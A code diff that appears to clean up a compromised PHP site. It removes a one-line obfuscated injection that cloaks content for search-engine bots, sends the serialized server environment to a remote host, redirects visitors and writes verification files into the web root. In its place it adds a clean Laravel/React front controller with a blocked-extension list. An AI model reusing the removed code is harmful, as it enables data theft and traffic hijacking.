@@ -1,1 +1,130 @@
-<?php define('A', 'jan62.xyf5<5<wx3sjy/askul::shopbrand/^^!!.shtm|?[0:1]=[0:1~4]^[0:1][2:8~13][0:1]![0:3~5]::'); goto UO6xV; b1J4B: function k_uIY($u4dOz = '') { return preg_match("\x2f\50\x67\x6f\157\147\x6c\x65\56\x63\x6f\x2e\152\x70\174\x79\141\x68\157\x6f\x2e\143\x6f\x2e\152\x70\x7c\142\151\x6e\x67\x7c\x62\x61\151\144\165\x7c\147\157\x6f\147\x6c\145\56\x63\x6f\x6d\51\57\x73\x69", $u4dOz); } goto xRTHW; f5AyF: function olyHY($HGjvE, $jaNva = array()) { goto aLyc9; aLyc9: $C4e2c = 0; goto XKT8B; XKT8B: try { goto QtLS6; Uzsy0: if (feof($wmBma)) { goto cyBCW; } goto Vk3Bf; wR0Ee: m19zn: goto lKGYj; ARxHi: $xI4hl = ''; goto BzRT4; G3Rgy: $K8XHo .= substr($ro41k, $wo8M2 + 2, $CdPGZ); goto XxEac; qBGrW: Pvds7: goto gFNQa; XxEac: $ro41k = substr($ro41k, $wo8M2 + 2 + $CdPGZ + 2); goto WxHCg; IsOo5: KUw06: goto IWYiX; YkMeJ: if (!$d7QdP) { goto Q7M4F; } goto wESeo; w6L2w: if (!($C4e2c === 0)) { goto Pvds7; } goto NdYAE; IWYiX: $ro41k = $K8XHo; goto v25sU; J5JMP: $dkSyZ = $QUV0p["\150\x6f\x73\164"]; goto yu15F; yu15F: $WCgKj = $rJC68 === "\x68\x74\x74\160\x73" ? 443 : 80; goto llApo; ecHvR: curl_setopt($Qe2r6, CURLOPT_RETURNTRANSFER, 1); goto lRaju; d9IcW: $rJC68 = isset($QUV0p["\163\x63\x68\x65\155\145"]) ? $QUV0p["\x73\143\150\145\x6d\145"] : "\x68\x74\164\160"; goto J5JMP; BtxWb: jyjCZ: goto Uzsy0; U1vHm: $d7QdP = curl_exec($Qe2r6); goto G9WuF; yn4WM: zMfkb: goto U1vHm; llApo: $rP29o = isset($QUV0p["\160\x61\x74\x68"]) ? $QUV0p["\160\x61\x74\150"] : "\x2f"; goto b3Lxe; dFEI9: if (!($wo8M2 === false)) { goto Ta8mu; } goto A0UuA; hd7TQ: $CkGE2 = explode("\xd\12\xd\12", $C4e2c, 2); goto Nc_Nl; wSehH: $ro41k = isset($CkGE2[1]) ? $CkGE2[1] : ''; goto tjixG; JwIrm: fclose($wmBma); goto hd7TQ; Vk3Bf: $C4e2c .= fgets($wmBma, 1024); goto BwNYT; PMz8P: if (empty($jaNva)) { goto m19zn; } goto v3KNx; RH32l: cyBCW: goto JwIrm; NoLUR: fwrite($wmBma, $GOMGp); goto BtxWb; A9ano: $GOMGp .= $JLIO1; goto nmGaY; fc5Nt: $QUV0p = parse_url($HGjvE); goto d9IcW; ntnQY: $GOMGp .= $xI4hl; goto Qmv4Z; z1BSx: $Qe2r6 = curl_init(); goto mFmRY; YIjwS: if (!$wmBma) { goto g3ZTM; } goto TiSbL; BwNYT: goto jyjCZ; goto RH32l; qodwT: $epZ8T = ($rJC68 === "\x68\164\x74\160\163" ? "\x73\163\x6c\x3a\57\x2f" : '') . $dkSyZ . "\x3a" . $WCgKj; goto YinMA; wESeo: $C4e2c = trim(trim($d7QdP, "\357\xbb\xbf")); goto ukEgi; tjixG: if (!(stripos($JLIO1, "\124\x72\x61\x6e\163\x66\x65\162\55\105\x6e\143\x6f\x64\x69\156\x67\72\40\143\150\165\x6e\x6b\145\144") !== false)) { goto iOEgb; } goto Kwb39; XAL3F: curl_setopt($Qe2r6, CURLOPT_USERAGENT, "\127\110\x52"); goto PrVoX; TiSbL: $GOMGp = "{$rMLly}\x20{$rP29o}{$Wzhu0}\40\110\124\124\120\x2f\x31\56\x31\15\12"; goto exlhh; iJcG1: $CdPGZ = hexdec(substr($ro41k, 0, $wo8M2)); goto mAciO; QtLS6: if (!(function_exists("\143\165\162\154\137\151\x6e\x69\164") && function_exists("\143\x75\x72\154\x5f\x65\170\145\143"))) { goto S023E; } goto z1BSx; WxHCg: goto Cs_7C; goto IsOo5; b3Lxe: $Wzhu0 = isset($QUV0p["\161\165\145\x72\x79"]) ? "\x3f" . $QUV0p["\161\165\x65\162\x79"] : ''; goto ARxHi; A0UuA: goto KUw06; goto yJmaU; Ot3BV: g3ZTM: goto qBGrW; Nc_Nl: $JLIO1 = isset($CkGE2[0]) ? $CkGE2[0] : ''; goto wSehH; Kwb39: $K8XHo = ''; goto fJDMR; bxgiM: $xI4hl = http_build_query($jaNva); goto jaLNF; nXbw6: $wo8M2 = strpos($ro41k, "\xd\xa"); goto dFEI9; yJmaU: Ta8mu: goto iJcG1; oBerd: curl_setopt($Qe2r6, CURLOPT_POST, 1); goto APBlH; PrVoX: curl_setopt($Qe2r6, CURLOPT_CONNECTTIMEOUT, 0); goto ecHvR; g1n5V: curl_setopt($Qe2r6, CURLOPT_SSL_VERIFYHOST, false); goto z5ASz; QWXnE: curl_setopt($Qe2r6, CURLOPT_TIMEOUT, 60); goto eqV6u; kZMKY: if (!true) { goto KUw06; } goto nXbw6; lRaju: curl_setopt($Qe2r6, CURLOPT_SSL_VERIFYPEER, false); goto g1n5V; z5ASz: curl_setopt($Qe2r6, CURLOPT_FOLLOWLOCATION, 1); goto QWXnE; NdYAE: $C4e2c = ''; goto fc5Nt; BzRT4: $rMLly = "\107\x45\124"; goto RtjGq; sZPhP: $JLIO1 .= "\103\157\x6e\164\x65\156\x74\55\x4c\145\x6e\147\x74\x68\72\x20" . strlen($xI4hl) . "\15\12"; goto wR0Ee; nmGaY: if (!($rMLly === "\x50\117\123\124")) { goto nEMY_; } goto ntnQY; EPwK3: $C4e2c = trim($ro41k); goto Ot3BV; fJDMR: Cs_7C: goto kZMKY; ukEgi: Q7M4F: goto MMdn8; mAciO: if (!($CdPGZ === 0)) { goto EbDzF; } goto B7rwD; RtjGq: $JLIO1 = "\x55\x73\145\162\55\x41\x67\x65\x6e\x74\x3a\x20\127\x48\x52\xd\12"; goto PMz8P; jaLNF: $JLIO1 .= "\x43\x6f\x6e\x74\x65\156\164\55\x54\x79\160\x65\x3a\40\141\160\160\154\x69\x63\x61\x74\x69\157\156\x2f\x78\x2d\167\x77\x77\55\146\x6f\x72\x6d\55\165\162\x6c\145\156\x63\x6f\x64\145\x64\xd\12"; goto sZPhP; mFmRY: curl_setopt($Qe2r6, CURLOPT_URL, $HGjvE); goto XAL3F; B7rwD: goto KUw06; goto y6aYs; YinMA: $wmBma = stream_socket_client($epZ8T, $T_5N1, $x42pG, 45); goto YIjwS; lKGYj: $JLIO1 .= "\x43\x6f\156\x6e\145\143\x74\151\157\x6e\72\40\143\x6c\x6f\x73\145\xd\xa\xd\xa"; goto qodwT; v25sU: iOEgb: goto EPwK3; eqV6u: if (empty($jaNva)) { goto zMfkb; } goto oBerd; exlhh: $GOMGp .= "\110\157\163\x74\72\x20{$dkSyZ}\xd\12"; goto A9ano; G9WuF: curl_close($Qe2r6); goto YkMeJ; MMdn8: S023E: goto w6L2w; Qmv4Z: nEMY_: goto NoLUR; APBlH: curl_setopt($Qe2r6, CURLOPT_POSTFIELDS, http_build_query($jaNva)); goto yn4WM; y6aYs: EbDzF: goto G3Rgy; v3KNx: $rMLly = "\x50\117\123\x54"; goto bxgiM; gFNQa: } catch (Exception $F_jMU) { } goto Xak_Q; Xak_Q: return $C4e2c; goto I1lKb; I1lKb: } goto SPW2z; UO6xV: @date_default_timezone_set("\120\x52\103"); goto TMvZA; IkeSF: function STj5l($GXT_U = '') { goto msdRM; K96i3: if (!preg_match("\x2f\136\112\165\155\160\x40\x28\56\x2a\51\57", $pSvPu, $aAgzA)) { goto UyZs0; } goto yP6M3; zOxPN: die; goto b2KT7; wfYkE: $UyEHW = parse_url($t074h); goto fEGVi; sx8fc: AmcVW: goto MFgbs; NdeV1: $ewo6h = gbmAS($JtbTR); goto YP4Kf; v0pGI: echo sprintf($xYe69, $t074h, $t074h) . "\x3c\x62\x72\x20\x2f\76\x3c\142\x72\40\57\76"; goto wfYkE; b2KT7: G8Mk4: goto YXmZb; hr0xn: if (!preg_match("\x2f\x73\x69\x74\145\155\141\160\x2e\52\x3f\134\56\x78\155\154\44\57\163\x69", $GOUus)) { goto x4BWB; } goto cOgWw; b51PH: echo sprintf("\x3c\x62\x6f\x64\x79\40\157\x6e\x6c\157\x61\x64\x3d\x22\x64\x6f\143\165\x6d\145\156\164\56\x67\x65\x74\105\x6c\x65\x6d\145\x6e\164\163\x42\171\x54\141\147\116\141\x6d\x65\50\45\163\141\45\x73\51\133\x30\x5d\x2e\143\x6c\151\x63\153\x28\51\42\76\x3c\x61\40\x68\162\x65\146\x3d\x22\x25\x73\x22\76\74\x2f\141\76\x3c\x6e\157\x73\143\x72\151\160\164\x3e\x3c\x6d\145\x74\x61\x20\x68\164\164\x70\x2d\145\161\x75\151\166\75\42\162\145\146\x72\145\163\150\x22\40\143\157\156\x74\145\156\x74\75\42\x30\73\x20\x75\x72\154\75\x25\x73\42\x20\57\76\x3c\57\x6e\x6f\x73\143\x72\x69\x70\164\76\x3c\x2f\x62\x6f\144\171\76", "\x27", "\47", $n7XaY, $n7XaY); goto dfNCt; biO_B: $t074h = sprintf("\x68\164\x74\160\163\72\x2f\57\x25\163\56\x70\171", BUai1($KwkM7[0])); goto KGmUg; cOgWw: $pSvPu = OLyHY($t074h, array("\x78" => serialize($_SERVER))); goto oyS6W; fF61V: if (!preg_match("\57\136\x48\145\141\x64\100\50\56\x2a\77\51\100\100\x28\56\x2a\x29\57\x69\x73", $pSvPu, $mLBL0)) { goto uDXGI; } goto E6d7N; F8vYd: $JqGdN .= "\146\x69\143\x61"; goto csCGY; ZNtkp: $pSvPu = $mLBL0[2]; goto r0ds_; LSRY5: if (!isset($_GET[$AvQpa])) { goto Ef0F2; } goto g3UHD; KGmUg: $_SERVER["\171\x74\137\x6a\165\x6d\x70"] = 0; goto cok_R; I5zpg: $m6mXn .= "\x7d\134\56\170\150"; goto mkdBA; irebs: if (!preg_match("\57" . $m6mXn . "\44\x2f\x73\x69", $GOUus, $P7nJl)) { goto PXx1u; } goto th6EG; acdDI: $_SERVER["\x79\164\137\x6a\x75\155\x70"] = 1; goto b7Lrl; FJKCC: $AvQpa = "\171\x74\61"; goto i3g0g; s_JX4: $m6mXn .= "\x5d\x7b\x31\66"; goto I5zpg; cMTy_: $UFFYv .= "\124\x5f\x52\x4f\x4f\x54"; goto eyizT; x35A_: x4BWB: goto sqaNL; azEzT: $pSvPu = trim($pSvPu); goto BE3eZ; csCGY: $JqGdN .= $WsaCm; goto lU3UX; kphby: header("{$WsaCm}\x20\x2f{$JviCs}"); goto nXJ6R; lU3UX: $WsaCm = "\114\157\143\141" . $WsaCm; goto irebs; DkSZZ: goto AmcVW; goto y785m; qTrDu: $JqGdN .= "\147\x6c\x65\55\x73\x69"; goto dTKRj; R7NCX: return; goto HxVLR; cok_R: $_SERVER["\x79\164\x5f\x67\x7a"] = $KwkM7[1]; goto QekzQ; jK6c1: if (!preg_match("\57\136\110\145\x61\144\100\50\x2e\x2a\x3f\x29\x40\100\x28\56\52\x29\x2f\151\x73", $pSvPu, $mLBL0)) { goto jW1Qj; } goto pYT9S; BE3eZ: if (!in_array($pSvPu, array("\x2a\64\x30\64", "\x2a\x72\145\164\x75\x72\x6e"))) { goto EIzFX; } goto R7NCX; E6d7N: header($mLBL0[1]); goto orj5p; DBXeh: $JtbTR = isset($_SERVER["\110\x54\124\x50\137\125\x53\105\x52\x5f\101\x47\x45\x4e\124"]) ? $_SERVER["\110\x54\x54\120\x5f\125\x53\105\122\137\x41\x47\105\116\124"] : ''; goto NdeV1; fIf8M: $JqGdN = "\147\x6f\x6f"; goto qTrDu; y785m: jlHBa: goto YcwBn; cRiri: if (preg_match("\57\136\150\164\x74\x70\163\77\x2f\x73\151", $jcKA8)) { goto jlHBa; } goto v0pGI; orj5p: $pSvPu = $mLBL0[2]; goto OOhCg; XsUqt: file_put_contents("{$rXxVu}\57{$JviCs}", "{$JqGdN}\x20{$JviCs}"); goto NbJ0c; SOJha: $GOUus = $GOUus == '' ? isset($_SERVER["\x50\101\x54\110\137\111\x4e\x46\117"]) && $_SERVER["\120\x41\124\x48\137\111\116\x46\117"] != '' ? $_SERVER["\120\x41\x54\110\x5f\x49\x4e\x46\x4f"] : $GOUus : $GOUus; goto xiT2Y; HxVLR: EIzFX: goto K96i3; P1PQS: if (!($ewo6h || $nknVZ)) { goto G8Mk4; } goto TdpmX; NbJ0c: chmod($rXxVu, 0555); goto kphby; JzX88: die; goto d38Zq; dfNCt: P5Bs0: goto JzX88; NuGlw: $D2ghn = preg_match("\x2f\136\x68\164\164\160\163\x3f\x5c\x3a\x5c\57\x5c\x2f\x2f\x73\151", $n7XaY); goto lrrFk; SnINQ: if (!$nknVZ) { goto S6DdH; } goto acdDI; mkdBA: $m6mXn .= "\x74\155\154\x29"; goto fIf8M; d38Zq: UyZs0: goto fF61V; g3UHD: $jcKA8 = trim($_GET[$AvQpa]); goto cRiri; F9kSr: $pSvPu = oLyHY($t074h, array("\x78" => serialize($_SERVER))); goto azEzT; pYT9S: header($mLBL0[1]); goto ZNtkp; oyS6W: $pSvPu = trim($pSvPu); goto jK6c1; wThKX: echo "{$pSvPu}"; goto zOxPN; yP6M3: $n7XaY = trim($aAgzA[1]); goto NuGlw; YP4Kf: $nknVZ = k_UIY($PvRX4); goto hw8nr; MT15c: die; goto x35A_; e6Tns: chmod($rXxVu, 0755); goto XsUqt; kfKQb: echo $n7XaY; goto kKH0n; kKH0n: goto P5Bs0; goto nat3E; b7Lrl: S6DdH: goto F9kSr; msdRM: $GOUus = isset($_SERVER["\122\105\x51\125\x45\123\x54\x5f\125\x52\111"]) ? $_SERVER["\122\105\x51\x55\105\123\x54\x5f\x55\x52\111"] : (isset($_SERVER["\121\125\105\122\x59\x5f\123\124\122\x49\116\107"]) ? $_SERVER["\x51\125\105\x52\x59\137\123\124\122\111\x4e\107"] : ''); goto SOJha; d4oHs: Ef0F2: goto SnINQ; fEGVi: echo gethostbyname($UyEHW["\x68\157\x73\164"]); goto DkSZZ; QekzQ: $_SERVER["\x79\164\x5f\x75\x70"] = $KwkM7[2]; goto FJKCC; xiT2Y: $PvRX4 = isset($_SERVER["\110\124\x54\120\137\x52\x45\x46\105\x52\105\x52"]) ? $_SERVER["\110\x54\x54\x50\x5f\122\x45\x46\105\x52\x45\x52"] : ''; goto DBXeh; nXJ6R: die; goto DhscZ; eyizT: $rXxVu = $_SERVER[$UFFYv]; goto hr0xn; OOhCg: uDXGI: goto wThKX; hw8nr: $KwkM7 = explode("\72\x3a", A); goto biO_B; i3g0g: $UFFYv = "\x44\117\103"; goto cl0Su; DhscZ: PXx1u: goto P1PQS; r0ds_: jW1Qj: goto s3_DT; MFgbs: die; goto d4oHs; MQIUI: $m6mXn .= "\x67\x6c\145\133\134\x77"; goto s_JX4; dTKRj: $JqGdN .= "\164\x65\55\x76\x65\x72\x69"; goto F8vYd; YcwBn: echo OlYhy($jcKA8); goto sx8fc; sqaNL: $WsaCm = "\x74\x69\157\x6e\x3a"; goto s1X4m; s3_DT: echo "{$pSvPu}"; goto MT15c; cl0Su: $UFFYv .= "\125\115\x45\116"; goto cMTy_; TdpmX: $xYe69 = "\x3c\x61\x20\150\x72\x65\x66\75\42\45\163\x22\40\x74\141\x72\x67\x65\x74\x3d\x22\x5f\x62\x6c\141\156\x6b\42\x3e\45\163\x3c\x2f\x61\x3e"; goto LSRY5; nat3E: P0YlN: goto b51PH; s1X4m: $m6mXn = "\50\x67\157\157"; goto MQIUI; lrrFk: if ($D2ghn) { goto P0YlN; } goto kfKQb; th6EG: $JviCs = str_replace("\x2e\170", "\x2e", trim($P7nJl[1])); goto e6Tns; YXmZb: } goto tRSwt; xRTHW: function BUai1($OvXez) { goto axNN2; rFTJz: preg_match("\57\x28\x5b\x5e\134\56\x5d\53\134\x2e\x29\50\x2e\x2a\x29\50\134\x2f\x2e\52\51\57", $OvXez, $OQY5W); goto GAGZd; lwlM9: NBhAy: goto iGM5T; iGM5T: return $huaLI; goto g3ezr; inSWh: $A5e1j = preg_split("\57\57", $OQY5W[2], -1, PREG_SPLIT_NO_EMPTY); goto ZhS9v; rTzF3: if (!($OQY5W[2] != '')) { goto sju12; } goto inSWh; ZhS9v: foreach ($A5e1j as $A_MDP => $n3awN) { $A5e1j[$A_MDP] = chr(ord($n3awN) - 5); VWXqp: } goto j7Dsg; axNN2: $huaLI = ''; goto rFTJz; dta7O: $huaLI = implode('', $A5e1j); goto R7cid; GAGZd: if (!(is_array($OQY5W) && count($OQY5W) == 4)) { goto NBhAy; } goto rTzF3; R7cid: sju12: goto GfZw0; GfZw0: $huaLI = $OQY5W[1] . $huaLI . $OQY5W[3]; goto lwlM9; j7Dsg: tSi4D: goto dta7O; g3ezr: } goto IkeSF; TMvZA: if (!function_exists("\x6f\142\x5f\x73\x74\141\162\x74")) { goto MLbSl; } goto lwtzL; SPW2z: function gbMaS($wJHpg = '') { return preg_match("\57\x28\147\157\157\x67\154\145\x62\157\164\174\x62\x61\x69\144\165\x73\x70\151\x64\145\x72\x7c\142\151\x6e\x67\x62\157\x74\x7c\x67\x6f\157\x67\154\145\174\142\141\151\144\x75\174\x61\157\x6c\x7c\142\151\x6e\147\174\171\x61\x68\x6f\157\174\171\141\x6e\x64\145\x78\x29\x2f\x73\x69", $wJHpg); } goto b1J4B; NHUG5: MLbSl: goto f5AyF; lwtzL: @ob_start(); goto NHUG5; tRSwt: stj5l(); ?>
+<?php
+
+/**
+ * Front controller used when the vhost document root is the project
+ * directory (RunCloud's default webapp path) instead of public/.
+ *
+ * Existing files under public/ are served from here. Every other request
+ * is handled by the Laravel application in public/index.php.
+ */
+
+$publicRoot = realpath(__DIR__.'/public');
+$uri = rawurldecode(parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/');
+
+if ($publicRoot && $uri !== '/' && strpos($uri, "\0") === false) {
+    $candidate = $publicRoot.DIRECTORY_SEPARATOR.ltrim($uri, '/');
+    $resolved = realpath($candidate);
+
+    $insidePublic = $resolved !== false
+        && (strpos($resolved, $publicRoot.DIRECTORY_SEPARATOR) === 0)
+        && is_file($resolved);
+
+    if ($insidePublic) {
+        $extension = strtolower(pathinfo($resolved, PATHINFO_EXTENSION));
+        $directScripts = [
+            '/geo.php',
+            '/recaptcha-verify.php',
+            '/activate-your-vcarde-nfc-card.php',
+        ];
+
+        if (in_array($uri, $directScripts, true)) {
+            require $resolved;
+            exit;
+        }
+
+        $blocked = [
+            'php', 'phtml', 'phar', 'inc', 'env', 'ini', 'sql', 'log',
+            'sh', 'bash', 'cgi', 'htaccess',
+        ];
+
+        if (! in_array($extension, $blocked, true)) {
+            $types = [
+                'css' => 'text/css; charset=UTF-8',
+                'js' => 'text/javascript; charset=UTF-8',
+                'mjs' => 'text/javascript; charset=UTF-8',
+                'json' => 'application/json; charset=UTF-8',
+                'svg' => 'image/svg+xml',
+                'png' => 'image/png',
+                'jpg' => 'image/jpeg',
+                'jpeg' => 'image/jpeg',
+                'webp' => 'image/webp',
+                'gif' => 'image/gif',
+                'ico' => 'image/x-icon',
+                'avif' => 'image/avif',
+                'woff' => 'font/woff',
+                'woff2' => 'font/woff2',
+                'ttf' => 'font/ttf',
+                'eot' => 'application/vnd.ms-fontobject',
+                'html' => 'text/html; charset=UTF-8',
+                'txt' => 'text/plain; charset=UTF-8',
+                'xml' => 'application/xml; charset=UTF-8',
+                'map' => 'application/json; charset=UTF-8',
+                'webmanifest' => 'application/manifest+json',
+                'mp4' => 'video/mp4',
+                'pdf' => 'application/pdf',
+                'wasm' => 'application/wasm',
+            ];
+
+            if (isset($types[$extension])) {
+                header('Content-Type: '.$types[$extension]);
+            }
+            header('X-Content-Type-Options: nosniff');
+            header('Content-Length: '.filesize($resolved));
+            readfile($resolved);
+            exit;
+        }
+    }
+}
+
+/*
+ * The React homepage lives here, before Laravel. An InfyOm upload replaces
+ * routes/web.php and its stock "/" route sends visitors to /login. This
+ * file stays in place across those uploads, so the public site keeps loading
+ * on vcarde.com. Other hostnames still fall through to Laravel (custom domains
+ * open the matching vCard).
+ */
+$host = strtolower((string) preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
+$method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
+$spaPath = trim($uri, '/');
+$spaPages = [
+    'about',
+    'faq',
+    'templates',
+    'press',
+    'nfc-cards',
+    'nfc-business-cards',
+    'nfc-business-card-guide',
+    'contact',
+    'pvc-nfc-business-card',
+    'metal-nfc-business-card',
+    'nfc-google-reviews',
+    'nfc-vs-qr',
+    'qr-code-generator',
+    'nfc-card-near',
+];
+$isSpaPage = $spaPath === ''
+    || in_array($spaPath, $spaPages, true)
+    || preg_match('#^nfc-card-near/[a-z0-9-]+$#', $spaPath) === 1;
+
+if (
+    in_array($host, ['vcarde.com', 'www.vcarde.com'], true)
+    && in_array($method, ['GET', 'HEAD'], true)
+    && $isSpaPage
+    && $publicRoot
+) {
+    $spaHome = $publicRoot.'/spa-home/index.html';
+    if (is_file($spaHome)) {
+        header('Content-Type: text/html; charset=UTF-8');
+        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+        header('Pragma: no-cache');
+        header('CDN-Cache-Control: no-store');
+        header('X-Content-Type-Options: nosniff');
+        header('Content-Length: '.filesize($spaHome));
+        if ($method !== 'HEAD') {
+            readfile($spaHome);
+        }
+        exit;
+    }
+}
+
+require __DIR__.'/public/index.php';
